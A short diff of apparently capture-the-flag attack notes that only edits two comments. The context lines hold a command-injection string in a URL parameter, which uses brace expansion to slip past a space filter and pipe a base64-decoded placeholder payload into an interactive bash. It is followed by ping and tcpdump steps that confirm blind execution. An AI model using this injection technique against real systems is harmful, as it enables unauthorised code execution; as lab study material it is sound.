@@ -283,12 +283,12 @@ u=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_
 
 # test locally: verify bash expansion without spaces - it can't contain pipes
 bash -c "{ping,-c,1,127.0.0.1}"
-# verify intercept packets locally
+# intercept packets locally
 tcpdump -i lo -n icmp
 
 # e.g. tun0 10.10.14.14
 ifconfig
-# verify intercept packets
+# intercept packets
 tcpdump -i tun0 -n icmp
 ping 10.10.10.160
 bash -c "{ping,-c,1,10.10.14.14}"
